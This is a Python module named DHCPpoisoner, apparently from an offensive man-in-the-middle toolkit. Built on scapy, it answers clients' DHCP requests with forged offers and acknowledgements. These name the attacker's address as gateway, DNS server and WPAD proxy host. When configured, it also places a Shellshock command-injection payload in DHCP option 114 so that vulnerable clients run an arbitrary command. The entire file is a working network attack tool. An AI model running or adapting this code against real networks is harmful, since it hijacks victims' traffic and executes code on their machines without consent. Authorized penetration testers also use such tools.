# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import threading
import binascii
import random

from netaddr import IPAddress, IPNetwork
from core.logger import logger
from scapy.all import *

formatter = logging.Formatter("%(asctime)s [DHCPpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("DHCPpoisoner", formatter)

class DHCPpoisoner():

    def __init__(self, options):
        self.interface   = options.interface
        self.ip_address  = options.ip
        self.mac_address = options.mac
        self.shellshock  = options.shellshock
        self.netmask     = options.netmask
        self.debug       = False
        self.dhcp_dic    = {}

        log.debug("interface  => {}".format(self.interface))
        log.debug("ip         => {}".format(self.ip_address))
        log.debug("mac        => {}".format(self.mac_address))
        log.debug("netmask    => {}".format(self.netmask))
        log.debug("shellshock => {}".format(self.shellshock))

    def start(self):
        self.s2 = conf.L2socket(iface=self.interface)

        t = threading.Thread(name="DHCPpoisoner", target=self.dhcp_sniff)
        t.setDaemon(True)
        t.start()

    def stop(self):
        self.s2.close()

    def dhcp_sniff(self):
        try:
            sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=self.interface)
        except Exception as e:
            if "Interrupted system call" not in e:
               log.error("Exception occurred while poisoning: {}".format(e))

    def get_client_ip(self, xid, dhcp_options):
        try:
            field_name, req_addr = dhcp_options[2]
            if field_name == 'requested_addr':
                return 'requested', req_addr

            raise ValueError
        except ValueError:
            for field in dhcp_options:
                if (field is tuple) and (field[0] == 'requested_addr'):
                    return field[1]

        if xid in self.dhcp_dic.keys():
            client_ip = self.dhcp_dic[xid]
            return 'stored', client_ip

        net = IPNetwork(self.ip_address + '/24')
        return 'generated', str(random.choice(list(net)))

    def dhcp_callback(self, resp):
        if resp.haslayer(DHCP):
            log.debug('Saw a DHCP packet')
            xid = resp[BOOTP].xid
            mac_addr = resp[Ether].src
            raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

            if resp[DHCP].options[0][1] == 1:
                method, client_ip = self.get_client_ip(xid, resp[DHCP].options)
                if method == 'requested':
                    log.info("Got DHCP DISCOVER from: {} requested_addr: {} xid: {}".format(mac_addr, client_ip, hex(xid)))
                else:
                    log.info("Got DHCP DISCOVER from: {} xid: {}".format(mac_addr, hex(xid)))

                packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
                IP(src=self.ip_address, dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
                DHCP(options=[("message-type", "offer"),
                    ('server_id', self.ip_address),
                    ('subnet_mask', self.netmask),
                    ('router', self.ip_address),
                    ('name_server', self.ip_address),
                    ('dns_server', self.ip_address),
                    ('lease_time', 172800),
                    ('renewal_time', 86400),
                    ('rebinding_time', 138240),
                    (252, 'http://{}/wpad.dat\\n'.format(self.ip_address)),
                    "end"]))

                log.info("Sending DHCP OFFER")
                self.s2.send(packet)

            if resp[DHCP].options[0][1] == 3:
                method, client_ip = self.get_client_ip(xid, resp[DHCP].options)
                if method == 'requested':
                    log.info("Got DHCP REQUEST from: {} requested_addr: {} xid: {}".format(mac_addr, client_ip, hex(xid)))
                else:
                    log.info("Got DHCP REQUEST from: {} xid: {}".format(mac_addr, hex(xid)))

                packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
                IP(src=self.ip_address, dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
                DHCP(options=[("message-type", "ack"),
                    ('server_id', self.ip_address),
                    ('subnet_mask', self.netmask),
                    ('router', self.ip_address),
                    ('name_server', self.ip_address),
                    ('dns_server', self.ip_address),
                    ('lease_time', 172800),
                    ('renewal_time', 86400),
                    ('rebinding_time', 138240),
                    (252, 'http://{}/wpad.dat\\n'.format(self.ip_address))]))

                if self.shellshock:
                    log.info("Sending DHCP ACK with shellshock payload")
                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
                    packet[DHCP].options.append("end")
                else:
                    log.info("Sending DHCP ACK")
                    packet[DHCP].options.append("end")

                self.s2.send(packet)
